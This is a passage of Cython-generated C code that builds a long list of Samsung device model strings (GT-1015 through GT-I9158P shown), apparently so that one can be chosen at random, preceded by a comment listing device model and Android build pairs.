'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
 * ugen=[]
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(381); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_kp_s_GT_1015);
  __Pyx_GIVEREF(__pyx_kp_s_GT_1015);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_kp_s_GT_1015);
  __Pyx_INCREF(__pyx_kp_s_GT_1020);
  __Pyx_GIVEREF(__pyx_kp_s_GT_1020);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_kp_s_GT_1020);
  __Pyx_INCREF(__pyx_kp_s_GT_1030);
  __Pyx_GIVEREF(__pyx_kp_s_GT_1030);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_kp_s_GT_1030);
  __Pyx_INCREF(__pyx_kp_s_GT_1035);
  __Pyx_GIVEREF(__pyx_kp_s_GT_1035);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_kp_s_GT_1035);
  __Pyx_INCREF(__pyx_kp_s_GT_1040);
  __Pyx_GIVEREF(__pyx_kp_s_GT_1040);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_kp_s_GT_1040);
  __Pyx_INCREF(__pyx_kp_s_GT_1045);
  __Pyx_GIVEREF(__pyx_kp_s_GT_1045);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_kp_s_GT_1045);
  __Pyx_INCREF(__pyx_kp_s_GT_1050);
  __Pyx_GIVEREF(__pyx_kp_s_GT_1050);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_kp_s_GT_1050);
  __Pyx_INCREF(__pyx_kp_s_GT_1240);
  __Pyx_GIVEREF(__pyx_kp_s_GT_1240);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_kp_s_GT_1240);
  __Pyx_INCREF(__pyx_kp_s_GT_1440);
  __Pyx_GIVEREF(__pyx_kp_s_GT_1440);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_kp_s_GT_1440);
  __Pyx_INCREF(__pyx_kp_s_GT_1450);
  __Pyx_GIVEREF(__pyx_kp_s_GT_1450);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_kp_s_GT_1450);
  __Pyx_INCREF(__pyx_kp_s_GT_18190);
  __Pyx_GIVEREF(__pyx_kp_s_GT_18190);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_kp_s_GT_18190);
  __Pyx_INCREF(__pyx_kp_s_GT_18262);
  __Pyx_GIVEREF(__pyx_kp_s_GT_18262);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_kp_s_GT_18262);
  __Pyx_INCREF(__pyx_kp_s_GT_19060I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_19060I);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_kp_s_GT_19060I);
  __Pyx_INCREF(__pyx_kp_s_GT_19082);
  __Pyx_GIVEREF(__pyx_kp_s_GT_19082);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_kp_s_GT_19082);
  __Pyx_INCREF(__pyx_kp_s_GT_19083);
  __Pyx_GIVEREF(__pyx_kp_s_GT_19083);
  PyList_SET_ITEM(__pyx_t_3, 14, __pyx_kp_s_GT_19083);
  __Pyx_INCREF(__pyx_kp_s_GT_19105);
  __Pyx_GIVEREF(__pyx_kp_s_GT_19105);
  PyList_SET_ITEM(__pyx_t_3, 15, __pyx_kp_s_GT_19105);
  __Pyx_INCREF(__pyx_kp_s_GT_19152);
  __Pyx_GIVEREF(__pyx_kp_s_GT_19152);
  PyList_SET_ITEM(__pyx_t_3, 16, __pyx_kp_s_GT_19152);
  __Pyx_INCREF(__pyx_kp_s_GT_19192);
  __Pyx_GIVEREF(__pyx_kp_s_GT_19192);
  PyList_SET_ITEM(__pyx_t_3, 17, __pyx_kp_s_GT_19192);
  __Pyx_INCREF(__pyx_kp_s_GT_19300);
  __Pyx_GIVEREF(__pyx_kp_s_GT_19300);
  PyList_SET_ITEM(__pyx_t_3, 18, __pyx_kp_s_GT_19300);
  __Pyx_INCREF(__pyx_kp_s_GT_19505);
  __Pyx_GIVEREF(__pyx_kp_s_GT_19505);
  PyList_SET_ITEM(__pyx_t_3, 19, __pyx_kp_s_GT_19505);
  __Pyx_INCREF(__pyx_kp_s_GT_2000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_2000);
  PyList_SET_ITEM(__pyx_t_3, 20, __pyx_kp_s_GT_2000);
  __Pyx_INCREF(__pyx_kp_s_GT_20000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_20000);
  PyList_SET_ITEM(__pyx_t_3, 21, __pyx_kp_s_GT_20000);
  __Pyx_INCREF(__pyx_kp_s_GT_200s);
  __Pyx_GIVEREF(__pyx_kp_s_GT_200s);
  PyList_SET_ITEM(__pyx_t_3, 22, __pyx_kp_s_GT_200s);
  __Pyx_INCREF(__pyx_kp_s_GT_3000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_3000);
  PyList_SET_ITEM(__pyx_t_3, 23, __pyx_kp_s_GT_3000);
  __Pyx_INCREF(__pyx_kp_s_GT_414XOP);
  __Pyx_GIVEREF(__pyx_kp_s_GT_414XOP);
  PyList_SET_ITEM(__pyx_t_3, 24, __pyx_kp_s_GT_414XOP);
  __Pyx_INCREF(__pyx_kp_s_GT_6918);
  __Pyx_GIVEREF(__pyx_kp_s_GT_6918);
  PyList_SET_ITEM(__pyx_t_3, 25, __pyx_kp_s_GT_6918);
  __Pyx_INCREF(__pyx_kp_s_GT_7010);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7010);
  PyList_SET_ITEM(__pyx_t_3, 26, __pyx_kp_s_GT_7010);
  __Pyx_INCREF(__pyx_kp_s_GT_7020);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7020);
  PyList_SET_ITEM(__pyx_t_3, 27, __pyx_kp_s_GT_7020);
  __Pyx_INCREF(__pyx_kp_s_GT_7030);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7030);
  PyList_SET_ITEM(__pyx_t_3, 28, __pyx_kp_s_GT_7030);
  __Pyx_INCREF(__pyx_kp_s_GT_7040);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7040);
  PyList_SET_ITEM(__pyx_t_3, 29, __pyx_kp_s_GT_7040);
  __Pyx_INCREF(__pyx_kp_s_GT_7050);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7050);
  PyList_SET_ITEM(__pyx_t_3, 30, __pyx_kp_s_GT_7050);
  __Pyx_INCREF(__pyx_kp_s_GT_7100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7100);
  PyList_SET_ITEM(__pyx_t_3, 31, __pyx_kp_s_GT_7100);
  __Pyx_INCREF(__pyx_kp_s_GT_7105);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7105);
  PyList_SET_ITEM(__pyx_t_3, 32, __pyx_kp_s_GT_7105);
  __Pyx_INCREF(__pyx_kp_s_GT_7110);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7110);
  PyList_SET_ITEM(__pyx_t_3, 33, __pyx_kp_s_GT_7110);
  __Pyx_INCREF(__pyx_kp_s_GT_7205);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7205);
  PyList_SET_ITEM(__pyx_t_3, 34, __pyx_kp_s_GT_7205);
  __Pyx_INCREF(__pyx_kp_s_GT_7210);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7210);
  PyList_SET_ITEM(__pyx_t_3, 35, __pyx_kp_s_GT_7210);
  __Pyx_INCREF(__pyx_kp_s_GT_7240R);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7240R);
  PyList_SET_ITEM(__pyx_t_3, 36, __pyx_kp_s_GT_7240R);
  __Pyx_INCREF(__pyx_kp_s_GT_7245);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7245);
  PyList_SET_ITEM(__pyx_t_3, 37, __pyx_kp_s_GT_7245);
  __Pyx_INCREF(__pyx_kp_s_GT_7303);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7303);
  PyList_SET_ITEM(__pyx_t_3, 38, __pyx_kp_s_GT_7303);
  __Pyx_INCREF(__pyx_kp_s_GT_7310);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7310);
  PyList_SET_ITEM(__pyx_t_3, 39, __pyx_kp_s_GT_7310);
  __Pyx_INCREF(__pyx_kp_s_GT_7320);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7320);
  PyList_SET_ITEM(__pyx_t_3, 40, __pyx_kp_s_GT_7320);
  __Pyx_INCREF(__pyx_kp_s_GT_7325);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7325);
  PyList_SET_ITEM(__pyx_t_3, 41, __pyx_kp_s_GT_7325);
  __Pyx_INCREF(__pyx_kp_s_GT_7326);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7326);
  PyList_SET_ITEM(__pyx_t_3, 42, __pyx_kp_s_GT_7326);
  __Pyx_INCREF(__pyx_kp_s_GT_7340);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7340);
  PyList_SET_ITEM(__pyx_t_3, 43, __pyx_kp_s_GT_7340);
  __Pyx_INCREF(__pyx_kp_s_GT_7405);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7405);
  PyList_SET_ITEM(__pyx_t_3, 44, __pyx_kp_s_GT_7405);
  __Pyx_INCREF(__pyx_kp_s_GT_7550_5GT_8005);
  __Pyx_GIVEREF(__pyx_kp_s_GT_7550_5GT_8005);
  PyList_SET_ITEM(__pyx_t_3, 45, __pyx_kp_s_GT_7550_5GT_8005);
  __Pyx_INCREF(__pyx_kp_s_GT_8010);
  __Pyx_GIVEREF(__pyx_kp_s_GT_8010);
  PyList_SET_ITEM(__pyx_t_3, 46, __pyx_kp_s_GT_8010);
  __Pyx_INCREF(__pyx_kp_s_GT_81);
  __Pyx_GIVEREF(__pyx_kp_s_GT_81);
  PyList_SET_ITEM(__pyx_t_3, 47, __pyx_kp_s_GT_81);
  __Pyx_INCREF(__pyx_kp_s_GT_810);
  __Pyx_GIVEREF(__pyx_kp_s_GT_810);
  PyList_SET_ITEM(__pyx_t_3, 48, __pyx_kp_s_GT_810);
  __Pyx_INCREF(__pyx_kp_s_GT_8105);
  __Pyx_GIVEREF(__pyx_kp_s_GT_8105);
  PyList_SET_ITEM(__pyx_t_3, 49, __pyx_kp_s_GT_8105);
  __Pyx_INCREF(__pyx_kp_s_GT_8110);
  __Pyx_GIVEREF(__pyx_kp_s_GT_8110);
  PyList_SET_ITEM(__pyx_t_3, 50, __pyx_kp_s_GT_8110);
  __Pyx_INCREF(__pyx_kp_s_GT_8220S);
  __Pyx_GIVEREF(__pyx_kp_s_GT_8220S);
  PyList_SET_ITEM(__pyx_t_3, 51, __pyx_kp_s_GT_8220S);
  __Pyx_INCREF(__pyx_kp_s_GT_8410);
  __Pyx_GIVEREF(__pyx_kp_s_GT_8410);
  PyList_SET_ITEM(__pyx_t_3, 52, __pyx_kp_s_GT_8410);
  __Pyx_INCREF(__pyx_kp_s_GT_9300);
  __Pyx_GIVEREF(__pyx_kp_s_GT_9300);
  PyList_SET_ITEM(__pyx_t_3, 53, __pyx_kp_s_GT_9300);
  __Pyx_INCREF(__pyx_kp_s_GT_9320);
  __Pyx_GIVEREF(__pyx_kp_s_GT_9320);
  PyList_SET_ITEM(__pyx_t_3, 54, __pyx_kp_s_GT_9320);
  __Pyx_INCREF(__pyx_kp_s_GT_93G);
  __Pyx_GIVEREF(__pyx_kp_s_GT_93G);
  PyList_SET_ITEM(__pyx_t_3, 55, __pyx_kp_s_GT_93G);
  __Pyx_INCREF(__pyx_kp_s_GT_A7100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_A7100);
  PyList_SET_ITEM(__pyx_t_3, 56, __pyx_kp_s_GT_A7100);
  __Pyx_INCREF(__pyx_kp_s_GT_A9500);
  __Pyx_GIVEREF(__pyx_kp_s_GT_A9500);
  PyList_SET_ITEM(__pyx_t_3, 57, __pyx_kp_s_GT_A9500);
  __Pyx_INCREF(__pyx_kp_s_GT_ANDROID);
  __Pyx_GIVEREF(__pyx_kp_s_GT_ANDROID);
  PyList_SET_ITEM(__pyx_t_3, 58, __pyx_kp_s_GT_ANDROID);
  __Pyx_INCREF(__pyx_kp_s_GT_B2710);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B2710);
  PyList_SET_ITEM(__pyx_t_3, 59, __pyx_kp_s_GT_B2710);
  __Pyx_INCREF(__pyx_kp_s_GT_B5330);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B5330);
  PyList_SET_ITEM(__pyx_t_3, 60, __pyx_kp_s_GT_B5330);
  __Pyx_INCREF(__pyx_kp_s_GT_B5330B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B5330B);
  PyList_SET_ITEM(__pyx_t_3, 61, __pyx_kp_s_GT_B5330B);
  __Pyx_INCREF(__pyx_kp_s_GT_B5330L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B5330L);
  PyList_SET_ITEM(__pyx_t_3, 62, __pyx_kp_s_GT_B5330L);
  __Pyx_INCREF(__pyx_kp_s_GT_B5330ZKAINU);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B5330ZKAINU);
  PyList_SET_ITEM(__pyx_t_3, 63, __pyx_kp_s_GT_B5330ZKAINU);
  __Pyx_INCREF(__pyx_kp_s_GT_B5510);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B5510);
  PyList_SET_ITEM(__pyx_t_3, 64, __pyx_kp_s_GT_B5510);
  __Pyx_INCREF(__pyx_kp_s_GT_B5512);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B5512);
  PyList_SET_ITEM(__pyx_t_3, 65, __pyx_kp_s_GT_B5512);
  __Pyx_INCREF(__pyx_kp_s_GT_B5722);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B5722);
  PyList_SET_ITEM(__pyx_t_3, 66, __pyx_kp_s_GT_B5722);
  __Pyx_INCREF(__pyx_kp_s_GT_B7510);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B7510);
  PyList_SET_ITEM(__pyx_t_3, 67, __pyx_kp_s_GT_B7510);
  __Pyx_INCREF(__pyx_kp_s_GT_B7722);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B7722);
  PyList_SET_ITEM(__pyx_t_3, 68, __pyx_kp_s_GT_B7722);
  __Pyx_INCREF(__pyx_kp_s_GT_B7810);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B7810);
  PyList_SET_ITEM(__pyx_t_3, 69, __pyx_kp_s_GT_B7810);
  __Pyx_INCREF(__pyx_kp_s_GT_B9150);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B9150);
  PyList_SET_ITEM(__pyx_t_3, 70, __pyx_kp_s_GT_B9150);
  __Pyx_INCREF(__pyx_kp_s_GT_B9388);
  __Pyx_GIVEREF(__pyx_kp_s_GT_B9388);
  PyList_SET_ITEM(__pyx_t_3, 71, __pyx_kp_s_GT_B9388);
  __Pyx_INCREF(__pyx_kp_s_GT_C3010);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3010);
  PyList_SET_ITEM(__pyx_t_3, 72, __pyx_kp_s_GT_C3010);
  __Pyx_INCREF(__pyx_kp_s_GT_C3262);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3262);
  PyList_SET_ITEM(__pyx_t_3, 73, __pyx_kp_s_GT_C3262);
  __Pyx_INCREF(__pyx_kp_s_GT_C3310R);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3310R);
  PyList_SET_ITEM(__pyx_t_3, 74, __pyx_kp_s_GT_C3310R);
  __Pyx_INCREF(__pyx_kp_s_GT_C3312);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3312);
  PyList_SET_ITEM(__pyx_t_3, 75, __pyx_kp_s_GT_C3312);
  __Pyx_INCREF(__pyx_kp_s_GT_C3312R);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3312R);
  PyList_SET_ITEM(__pyx_t_3, 76, __pyx_kp_s_GT_C3312R);
  __Pyx_INCREF(__pyx_kp_s_GT_C3313T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3313T);
  PyList_SET_ITEM(__pyx_t_3, 77, __pyx_kp_s_GT_C3313T);
  __Pyx_INCREF(__pyx_kp_s_GT_C3322);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3322);
  PyList_SET_ITEM(__pyx_t_3, 78, __pyx_kp_s_GT_C3322);
  __Pyx_INCREF(__pyx_kp_s_GT_C3322i);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3322i);
  PyList_SET_ITEM(__pyx_t_3, 79, __pyx_kp_s_GT_C3322i);
  __Pyx_INCREF(__pyx_kp_s_GT_C3520);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3520);
  PyList_SET_ITEM(__pyx_t_3, 80, __pyx_kp_s_GT_C3520);
  __Pyx_INCREF(__pyx_kp_s_GT_C3520I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3520I);
  PyList_SET_ITEM(__pyx_t_3, 81, __pyx_kp_s_GT_C3520I);
  __Pyx_INCREF(__pyx_kp_s_GT_C3592);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3592);
  PyList_SET_ITEM(__pyx_t_3, 82, __pyx_kp_s_GT_C3592);
  __Pyx_INCREF(__pyx_kp_s_GT_C3595);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3595);
  PyList_SET_ITEM(__pyx_t_3, 83, __pyx_kp_s_GT_C3595);
  __Pyx_INCREF(__pyx_kp_s_GT_C3782);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C3782);
  PyList_SET_ITEM(__pyx_t_3, 84, __pyx_kp_s_GT_C3782);
  __Pyx_INCREF(__pyx_kp_s_GT_C6712);
  __Pyx_GIVEREF(__pyx_kp_s_GT_C6712);
  PyList_SET_ITEM(__pyx_t_3, 85, __pyx_kp_s_GT_C6712);
  __Pyx_INCREF(__pyx_kp_s_GT_E1282T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_E1282T);
  PyList_SET_ITEM(__pyx_t_3, 86, __pyx_kp_s_GT_E1282T);
  __Pyx_INCREF(__pyx_kp_s_GT_E1500);
  __Pyx_GIVEREF(__pyx_kp_s_GT_E1500);
  PyList_SET_ITEM(__pyx_t_3, 87, __pyx_kp_s_GT_E1500);
  __Pyx_INCREF(__pyx_kp_s_GT_E2200);
  __Pyx_GIVEREF(__pyx_kp_s_GT_E2200);
  PyList_SET_ITEM(__pyx_t_3, 88, __pyx_kp_s_GT_E2200);
  __Pyx_INCREF(__pyx_kp_s_GT_E2202);
  __Pyx_GIVEREF(__pyx_kp_s_GT_E2202);
  PyList_SET_ITEM(__pyx_t_3, 89, __pyx_kp_s_GT_E2202);
  __Pyx_INCREF(__pyx_kp_s_GT_E2250);
  __Pyx_GIVEREF(__pyx_kp_s_GT_E2250);
  PyList_SET_ITEM(__pyx_t_3, 90, __pyx_kp_s_GT_E2250);
  __Pyx_INCREF(__pyx_kp_s_GT_E2252);
  __Pyx_GIVEREF(__pyx_kp_s_GT_E2252);
  PyList_SET_ITEM(__pyx_t_3, 91, __pyx_kp_s_GT_E2252);
  __Pyx_INCREF(__pyx_kp_s_GT_E2600);
  __Pyx_GIVEREF(__pyx_kp_s_GT_E2600);
  PyList_SET_ITEM(__pyx_t_3, 92, __pyx_kp_s_GT_E2600);
  __Pyx_INCREF(__pyx_kp_s_GT_E2652W);
  __Pyx_GIVEREF(__pyx_kp_s_GT_E2652W);
  PyList_SET_ITEM(__pyx_t_3, 93, __pyx_kp_s_GT_E2652W);
  __Pyx_INCREF(__pyx_kp_s_GT_E3210);
  __Pyx_GIVEREF(__pyx_kp_s_GT_E3210);
  PyList_SET_ITEM(__pyx_t_3, 94, __pyx_kp_s_GT_E3210);
  __Pyx_INCREF(__pyx_kp_s_GT_E3309);
  __Pyx_GIVEREF(__pyx_kp_s_GT_E3309);
  PyList_SET_ITEM(__pyx_t_3, 95, __pyx_kp_s_GT_E3309);
  __Pyx_INCREF(__pyx_kp_s_GT_E3309I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_E3309I);
  PyList_SET_ITEM(__pyx_t_3, 96, __pyx_kp_s_GT_E3309I);
  __Pyx_INCREF(__pyx_kp_s_GT_E3309T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_E3309T);
  PyList_SET_ITEM(__pyx_t_3, 97, __pyx_kp_s_GT_E3309T);
  __Pyx_INCREF(__pyx_kp_s_GT_G530H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_G530H);
  PyList_SET_ITEM(__pyx_t_3, 98, __pyx_kp_s_GT_G530H);
  __Pyx_INCREF(__pyx_kp_s_GT_g900f);
  __Pyx_GIVEREF(__pyx_kp_s_GT_g900f);
  PyList_SET_ITEM(__pyx_t_3, 99, __pyx_kp_s_GT_g900f);
  __Pyx_INCREF(__pyx_kp_s_GT_G930F);
  __Pyx_GIVEREF(__pyx_kp_s_GT_G930F);
  PyList_SET_ITEM(__pyx_t_3, 100, __pyx_kp_s_GT_G930F);
  __Pyx_INCREF(__pyx_kp_s_GT_H9500);
  __Pyx_GIVEREF(__pyx_kp_s_GT_H9500);
  PyList_SET_ITEM(__pyx_t_3, 101, __pyx_kp_s_GT_H9500);
  __Pyx_INCREF(__pyx_kp_s_GT_I5508);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I5508);
  PyList_SET_ITEM(__pyx_t_3, 102, __pyx_kp_s_GT_I5508);
  __Pyx_INCREF(__pyx_kp_s_GT_I5801);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I5801);
  PyList_SET_ITEM(__pyx_t_3, 103, __pyx_kp_s_GT_I5801);
  __Pyx_INCREF(__pyx_kp_s_GT_I6410);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I6410);
  PyList_SET_ITEM(__pyx_t_3, 104, __pyx_kp_s_GT_I6410);
  __Pyx_INCREF(__pyx_kp_s_GT_I8150);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I8150);
  PyList_SET_ITEM(__pyx_t_3, 105, __pyx_kp_s_GT_I8150);
  __Pyx_INCREF(__pyx_kp_s_GT_I8160OKLTPA);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I8160OKLTPA);
  PyList_SET_ITEM(__pyx_t_3, 106, __pyx_kp_s_GT_I8160OKLTPA);
  __Pyx_INCREF(__pyx_kp_s_GT_I8160ZWLTTT);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I8160ZWLTTT);
  PyList_SET_ITEM(__pyx_t_3, 107, __pyx_kp_s_GT_I8160ZWLTTT);
  __Pyx_INCREF(__pyx_kp_s_GT_I8258);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I8258);
  PyList_SET_ITEM(__pyx_t_3, 108, __pyx_kp_s_GT_I8258);
  __Pyx_INCREF(__pyx_kp_s_GT_I8262D);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I8262D);
  PyList_SET_ITEM(__pyx_t_3, 109, __pyx_kp_s_GT_I8262D);
  __Pyx_INCREF(__pyx_kp_s_GT_I8268);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I8268);
  PyList_SET_ITEM(__pyx_t_3, 110, __pyx_kp_s_GT_I8268);
  __Pyx_INCREF(__pyx_kp_s_GT_I8505);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I8505);
  PyList_SET_ITEM(__pyx_t_3, 111, __pyx_kp_s_GT_I8505);
  __Pyx_INCREF(__pyx_kp_s_GT_I8530BAABTU);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I8530BAABTU);
  PyList_SET_ITEM(__pyx_t_3, 112, __pyx_kp_s_GT_I8530BAABTU);
  __Pyx_INCREF(__pyx_kp_s_GT_I8530BALCHO);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I8530BALCHO);
  PyList_SET_ITEM(__pyx_t_3, 113, __pyx_kp_s_GT_I8530BALCHO);
  __Pyx_INCREF(__pyx_kp_s_GT_I8530BALTTT);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I8530BALTTT);
  PyList_SET_ITEM(__pyx_t_3, 114, __pyx_kp_s_GT_I8530BALTTT);
  __Pyx_INCREF(__pyx_kp_s_GT_I8550E);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I8550E);
  PyList_SET_ITEM(__pyx_t_3, 115, __pyx_kp_s_GT_I8550E);
  __Pyx_INCREF(__pyx_kp_s_GT_i8700);
  __Pyx_GIVEREF(__pyx_kp_s_GT_i8700);
  PyList_SET_ITEM(__pyx_t_3, 116, __pyx_kp_s_GT_i8700);
  __Pyx_INCREF(__pyx_kp_s_GT_I8750);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I8750);
  PyList_SET_ITEM(__pyx_t_3, 117, __pyx_kp_s_GT_I8750);
  __Pyx_INCREF(__pyx_kp_s_GT_I900);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I900);
  PyList_SET_ITEM(__pyx_t_3, 118, __pyx_kp_s_GT_I900);
  __Pyx_INCREF(__pyx_kp_s_GT_I9008L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9008L);
  PyList_SET_ITEM(__pyx_t_3, 119, __pyx_kp_s_GT_I9008L);
  __Pyx_INCREF(__pyx_kp_s_GT_i9040);
  __Pyx_GIVEREF(__pyx_kp_s_GT_i9040);
  PyList_SET_ITEM(__pyx_t_3, 120, __pyx_kp_s_GT_i9040);
  __Pyx_INCREF(__pyx_kp_s_GT_I9080E);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9080E);
  PyList_SET_ITEM(__pyx_t_3, 121, __pyx_kp_s_GT_I9080E);
  __Pyx_INCREF(__pyx_kp_s_GT_I9082C);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9082C);
  PyList_SET_ITEM(__pyx_t_3, 122, __pyx_kp_s_GT_I9082C);
  __Pyx_INCREF(__pyx_kp_s_GT_I9082EWAINU);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9082EWAINU);
  PyList_SET_ITEM(__pyx_t_3, 123, __pyx_kp_s_GT_I9082EWAINU);
  __Pyx_INCREF(__pyx_kp_s_GT_I9082i);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9082i);
  PyList_SET_ITEM(__pyx_t_3, 124, __pyx_kp_s_GT_I9082i);
  __Pyx_INCREF(__pyx_kp_s_GT_I9100G);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9100G);
  PyList_SET_ITEM(__pyx_t_3, 125, __pyx_kp_s_GT_I9100G);
  __Pyx_INCREF(__pyx_kp_s_GT_I9100LKLCHT);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9100LKLCHT);
  PyList_SET_ITEM(__pyx_t_3, 126, __pyx_kp_s_GT_I9100LKLCHT);
  __Pyx_INCREF(__pyx_kp_s_GT_I9100M);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9100M);
  PyList_SET_ITEM(__pyx_t_3, 127, __pyx_kp_s_GT_I9100M);
  __Pyx_INCREF(__pyx_kp_s_GT_I9100P);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9100P);
  PyList_SET_ITEM(__pyx_t_3, 128, __pyx_kp_s_GT_I9100P);
  __Pyx_INCREF(__pyx_kp_s_GT_I9100T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9100T);
  PyList_SET_ITEM(__pyx_t_3, 129, __pyx_kp_s_GT_I9100T);
  __Pyx_INCREF(__pyx_kp_s_GT_I9105UANDBT);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9105UANDBT);
  PyList_SET_ITEM(__pyx_t_3, 130, __pyx_kp_s_GT_I9105UANDBT);
  __Pyx_INCREF(__pyx_kp_s_GT_I9128E);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9128E);
  PyList_SET_ITEM(__pyx_t_3, 131, __pyx_kp_s_GT_I9128E);
  __Pyx_INCREF(__pyx_kp_s_GT_I9128I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9128I);
  PyList_SET_ITEM(__pyx_t_3, 132, __pyx_kp_s_GT_I9128I);
  __Pyx_INCREF(__pyx_kp_s_GT_I9128V);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9128V);
  PyList_SET_ITEM(__pyx_t_3, 133, __pyx_kp_s_GT_I9128V);
  __Pyx_INCREF(__pyx_kp_s_GT_I9158P);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9158P);
  PyList_SET_ITEM(__pyx_t_3, 134, __pyx_kp_s_GT_I9158P);
